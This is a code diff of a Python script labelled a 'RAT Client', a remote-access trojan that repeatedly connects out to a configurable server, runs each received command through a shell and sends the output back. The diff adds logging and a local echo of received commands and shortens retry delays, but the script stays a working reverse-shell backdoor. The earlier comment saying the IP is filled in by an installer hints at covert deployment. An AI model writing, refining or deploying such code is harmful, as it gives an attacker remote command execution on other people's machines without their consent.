@@ -11,36 +11,60 @@ import sys
 import time
 
 # CONFIGURATION
-SERVER_IP = '127.0.0.0'  # REPLACED_BY_INSTALLER_IF_PROVIDED
+SERVER_IP = '127.0.0.0'  # REPLACE WITH YOUR SERVER IP
 SERVER_PORT = 9999
 
 def connect():
     while True:
         try:
+            print(f"[*] Attempting to connect to {SERVER_IP}:{SERVER_PORT}...")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((SERVER_IP, SERVER_PORT))
+            print("[+] Connection established successfully!")
             return s
-        except:
-            time.sleep(60) # Wait 1 minute before retrying
+        except Exception as e:
+            print(f"[-] Connection failed: {e}")
+            print("[*] Waiting 10 seconds before retrying...")
+            time.sleep(10)
 
 def main():
+    print("--- RAT Client Started ---")
+    print("Waiting for commands. Will display received commands below.")
+    
     while True:
         try:
             socket_conn = connect()
             while True:
+                # Receive command
                 command = socket_conn.recv(1024).decode()
+                
                 if command.lower() == 'exit':
+                    print("[!] Received 'exit' command. Closing connection.")
                     socket_conn.close()
                     break
+                
+                # --- DEBUG/ECHO FEATURE START ---
+                # Print the received command to the local terminal
+                print(f"\n[RECEIVED COMMAND]: {command}")
+                # --- DEBUG/ECHO FEATURE END ---
+
+                # Execute command
                 try:
                     result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
-                    socket_conn.send(result)
+                    output = result
                 except subprocess.CalledProcessError as e:
-                    socket_conn.send(e.output)
+                    output = e.output
                 except Exception as e:
-                    socket_conn.send(str(e).encode())
-        except:
-            pass
+                    output = str(e).encode()
+                
+                # Send result back to server
+                socket_conn.send(output)
+                print("[*] Command executed and output sent.")
+                
+        except Exception as e:
+            print(f"[-] Connection lost or error occurred: {e}")
+            print("[*] Reconnecting in 5 seconds...")
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
